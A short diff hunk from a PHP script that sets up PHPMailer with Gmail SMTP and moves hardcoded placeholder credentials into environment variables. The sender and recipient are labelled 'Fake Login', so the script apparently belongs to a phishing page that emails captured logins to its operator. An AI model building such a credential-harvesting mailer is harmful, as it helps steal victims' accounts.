@@ -39,11 +39,11 @@
 				$mail->SMTPAuth = true; 
 				$mail->SMTPSecure = 'tls';
 				$mail->Port = 587;
-				$mail->Username = 'yourusername@gmail.com'; 
-				$mail->Password = 'yourpassword';
-				$mail->From = "yourusername@gmail.com";
+				$mail->Username = getenv('email'); 
+				$mail->Password = getenv('password');
+				$mail->From = getenv('email');
 				$mail->FromName = "Fake Login";
-				$mail->AddAddress('yourusername@gmail.com', 'Fake Login');
+				$mail->AddAddress(getenv('email'), 'Fake Login');
 				$mail->IsHTML(true);
 				
 				$mail->Subject = "Help translate";
